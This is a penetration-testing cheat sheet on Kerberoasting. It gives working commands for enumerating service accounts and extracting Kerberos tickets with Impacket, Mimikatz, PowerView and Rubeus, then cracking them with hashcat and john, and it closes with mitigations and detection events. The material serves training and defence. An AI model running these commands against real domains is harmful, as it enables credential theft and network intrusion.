### Content

- [Cracking TGS](#cracking-tgs)
- [From Linux](#from-linux)
- [From Windows](#from-windows)
	- [Enumeration](#enumeration)
		- [PowerShell Script](#powershell-script)
		- [Native SETSPN.EXE Windows Binary](#native-setspn.exe-windows-binary)
		- [PowerView](#powerview)
	- [Exploitation](#exploitation)
		- [MimiKatz](#mimikatz)
		- [PowerView](#powerview)
		- [Rubeus](#rubeus)
- [Mitigations and Detections](#mitigations-and-detections)

---

> [!Note]
> 
> During a penetration test, if an SPN is found tied to a user account and cracking was unsuccessful, it should be marked as a low severity finding and just noted that this allows attackers to perform offline password cracking attacks against this account. The potential risk here is that if, someday, this account's password is set to something weaker that an attacker can crack.

A part of the TGS is encrypted with the NTLM hash of the password of the account which running the service, sometimes these accounts are user made accounts and it's subjected to human error by placing a weak password for the account, So an attacker can find that account's password by brute forcing the TGS.
 
 - This attack targets [Service Principal Names (SPN)](https://docs.microsoft.com/en-us/windows/win32/ad/service-principal-names) accounts.
 - All you need to perform a Kerberoasting attack is an account's cleartext password (or NTLM hash), a shell in the context of a domain user account, or SYSTEM level access on a domain-joined host. 
 - Domain accounts running services are often local administrators.
 - The attack can be performed in multiple ways:
	- From a non-domain joined Linux host using valid domain user credentials.
	- From a domain-joined Linux host as root after retrieving the keytab file.
	- From a domain-joined Windows host authenticated as a domain user.
	- From a domain-joined Windows host with a shell in the context of a domain account.
	- As SYSTEM on a domain-joined Windows host.
	- From a non-domain joined Windows host using [runas](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525(v=ws.11)) /`netonly`.

LDAP filter to return user accounts that have SPNs

```LDAP
&(objectCategory=person)(objectClass=user)(servicePrincipalName=*)
```

> [!Important]
> 
> Decrypting TGS-REP Tickets with `hashcat` :
> 
> - `$krb5tgs$23$*` -> RC4 (type 23) encrypted ticket -> `-m 13100`
> - `$krb5tgs$18$*` -> AES-256 (type 18) encrypted ticket -> `-m 19700`
> - `$krb5tgs$17$*` -> AES-128 (type 17) encrypted ticket -> `-m 19600`

##### Cracking TGS

``` Bash
# put the base64 in a file (mimi_out) without wraping 
$ cat mimi_out | tr -d \\n | base64 -d > sqldev.kirbi

# Convert the kribi file to a john crackable format file
$ kirbi2john sqldev.kirbi > john_sqldev_tgs
# Crack the TGS with john
$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs john_sqldev_tgs

# Convert the john crackable format file to a hashcat crackable format file
# Or Modifiying john_sqldev_tgs for Hashcat
$ sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' john_sqldev_tgs > hashcat_sqldev_tgs

# Crack it with hashcat
$ hashcat -m 13100 hashcat_sqldev_tgs /usr/share/wordlists/rockyou.txt 
```

---
### From Linux

Using `impacket-GetUserSPNs`

``` Bash
# Listing SPN Accounts with GetUserSPNs
$ impacket-GetUserSPNs -dc-ip <domain_controler_IP> DOMAIN.LOCAL/ADuser
# Requesting all available TGS tickets
$ impacket-GetUserSPNs -dc-ip <domain_controler_IP> DOMAIN.LOCAL/ADuser -request 
# Requesting a single TGS ticket
$ impacket-GetUserSPNs -dc-ip <domain_controler_IP> DOMAIN.LOCAL/ADuser -request-user sqldev
# Use the (-outputfile <fileName>) flag to write the TGS tickets to a file
# Cracking the Ticket Offline with Hashcat
$ hashcat -m 13100 <file_contains_TGS_ticket/s> /usr/share/wordlists/rockyou.txt
# To test a set of credentials agains a domain
$ crackmapexec smb 172.16.5.5 -u ADuser -p password
```

---
### From Windows 
#### Enumeration
##### PowerShell Script

This script connects to the Domain Controller and searches for all objects that match our provided filter. Each result shows us its name (Distinguished Name) and the list of SPNs associated with this account.

```PowerShell
$search = New-Object DirectoryServices.DirectorySearcher([ADSI]"")
$search.filter = "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))"
$results = $search.Findall()
foreach($result in $results)
{
    $userEntry = $result.GetDirectoryEntry()
    Write-host "User" 
    Write-Host "===="
    Write-Host $userEntry.name "(" $userEntry.distinguishedName ")"
        Write-host ""
    Write-host "SPNs"
    Write-Host "===="     
    foreach($SPN in $userEntry.servicePrincipalName)
    {
        $SPN       
    }
    Write-host ""
    Write-host ""
}
```

##### Native SETSPN.EXE Windows Binary

``` PowerShell
# Enumerating SPNs with setspn.exe
# We will focus on user accounts and ignore the computer accounts returned by the tool.
PS C:\> setspn.exe -Q */*
....
CN=sqldev,OU=Service Accounts,OU=Corp,DC=DOMAIN,DC=LOCAL
        MSSQLSvc/DEV-PRE-SQL.domain.local:1433
....[SNIP]....
```

##### PowerView

```PowerShell
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> Get-DomainUser -SPN

# Check the supported ecryption type attribute
# msDS-SupportedEncryptionTypes = (0) / (0x0)  -> defaults to RC4_HMAC_MD5
# msDS-SupportedEncryptionTypes = (24)/ (0x18) -> AES 128, AES 256
PS C:\> Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes 
```

Check [Supported Kerberos Encryption Types](https://techcommunity.microsoft.com/blog/coreinfrastructureandsecurityblog/decrypting-the-selection-of-supported-kerberos-encryption-types/1628797) for more knowledge about the `msDS-SupportedEncryptionTypes` attribute and what it's refer to.

#### Exploitation

##### MimiKatz

```PowerShell
# Request a TGS ticket for an account in the above output and load it into memory.
PS C:\> Add-Type -AssemblyName System.IdentityModel
PS C:\> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.domain.local:1433"

# Request All Tickets Using setspn.exe instead of retrive them one by one and load them into memory
PS C:\> Add-Type -AssemblyName System.IdentityModel
PS C:\> setspn.exe -T DOMAIN.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() } 

# Extract the tickets that we load into the memory from above commands with mimikatz.exe
mimikatz # base64 /out:true
mimikatz # kerberos::list /export 
# The output will be the Base64 blop of the kirbi files
# If we do not specify the base64 /out:true command, Mimikatz will extract the tickets and write them to .kirbi files.
```

> - The [Add-Type](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/add-type?view=powershell-7.2) cmdlet is used to add a .NET framework class to our PowerShell session, which can then be instantiated like any .NET framework object
> - The `-AssemblyName` parameter allows us to specify an assembly that contains types that we are interested in using
> - [System.IdentityModel](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel?view=netframework-4.8) is a namespace that contains different classes for building security token services
> - We'll then use the [New-Object](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/new-object?view=powershell-7.2) cmdlet to create an instance of a .NET Framework object
> - We'll use the [System.IdentityModel.Tokens](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens?view=netframework-4.8) namespace with the [KerberosRequestorSecurityToken](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens.kerberosrequestorsecuritytoken?view=netframework-4.8) class to create a security token and pass the SPN name to the class to request a Kerberos TGS ticket for the target account in our current logon session.

##### PowerView

``` PowerShell
# Using PowerView to enuemrate SPN accounts then extract one or all TGS tickets
PS C:\> Get-DomainUser * -spn | select samaccountname
# Exporting a sepcific account's TGS ticket.
PS C:\> Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
# Exporting All Tickets to a CSV File.
PS C:\> Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\domain_tgs.csv -NoTypeInformation

# Extract the hashes to be ready for hashcat
### On the attacker machine $ grep -o '\$krb5tgs\$[^"]*' hashes.txt > toCrack.txt
```

Or use the ready cmdlet `Invoke-Kerberoast`

```PowerShell
PS C:\> (Invoke-Kerberoast).Hash
```

##### Rubeus

``` PowerShell
# Statistics about Kerberoastable accounts without sending any ticket requests
PS C:\> Rubeus.exe kerberoast /stats 

# Get TGSs for every service on a user account
PS C:\> Rubeus.exe kerberoast /nowrap /outfile:tickets.txt

# Target high value accounts at first
PS C:\> Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap 

# Target a specific user account, returning a service ticket encrypted with the highest level of encryption supported by the target account. 
PS C:\> Rubeus.exe kerberoast /user:testspn /nowrap

# /tgtdeleg flag to force RC4 encryption.
PS C:\> Rubeus.exe kerberoast /tgtdeleg /user:testspn /nowrap
# Note: This does not work against a Windows Server 2019 Domain Controller, regardless of the domain functional level.
```

Kerberoasting without an Account Password can be done if an attacker has:

1. Username of an account with pre-authentication disabled. (`DONT_REQ_PREAUTH`)
2. A target SPN or a list of SPNs.

Performing the Attack with `/nopreauth`:

```PowerShell
PS C:\Tools> Rubeus.exe kerberoast /nopreauth:amber.smith /domain:inlanefreight.local /spn:MSSQLSvc/SQL01:1433 /nowrap

# Instead of /spn we can use /spns:listofspn.txt to try multiple SPNs. 
```

---
### Mitigations and Detections

Edit the encryption types used by Kerberos
`Open Group Policy > Edit the defautl domain policy > Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options > double-click on (Network security: Configure encryption types allowed for Kerberos) `

<img src="/assets/kerb_encrypt_types.png" style="height:60%px;width:60%">

> Removing support for AES would introduce a security flaw into AD and should likely never be done.
> Furthermore, removing support for RC4 regardless of the Domain Controller Windows Server version or domain functional level could have operational impacts and should be thoroughly tested before implementation.
> 
> An important mitigation for non-managed service accounts is to set a long and complex password or passphrase that does not appear in any word list and would take far too long to crack. However, it is recommended to use [Managed Service Accounts (MSA)](https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/managed-service-accounts-understanding-implementing-best/ba-p/397009), and [Group Managed Service Accounts (gMSA)](https://docs.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview), which use very complex passwords, and automatically rotate on a set interval (like machine accounts) or accounts set up with LAPS.

Kerberoasting requests Kerberos TGS tickets with RC4 encryption, which should not be the majority of Kerberos activity within a domain. When Kerberoasting is occurring in the environment, we will see an abnormal number of `TGS-REQ` and `TGS-REP` requests and responses, signaling the use of automated Kerberoasting tools. Domain controllers can be configured to log Kerberos TGS ticket requests by selecting [Audit Kerberos Service Ticket Operations](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-kerberos-service-ticket-operations) within Group Policy.

<img src="/assets/kerb_audit.png" style="height:60%px;width:60%">

Doing so will generate two separate event IDs: [4769](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4769): A Kerberos service ticket was requested, and [4770](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4770): A Kerberos service ticket was renewed. 10-20 Kerberos TGS requests for a given account can be considered normal in a given environment. A large amount of 4769 event IDs from one account within a short period may indicate an attack.

[Some mitigation and detection strategies for Kerberoasting](https://adsecurity.org/?p=3458).
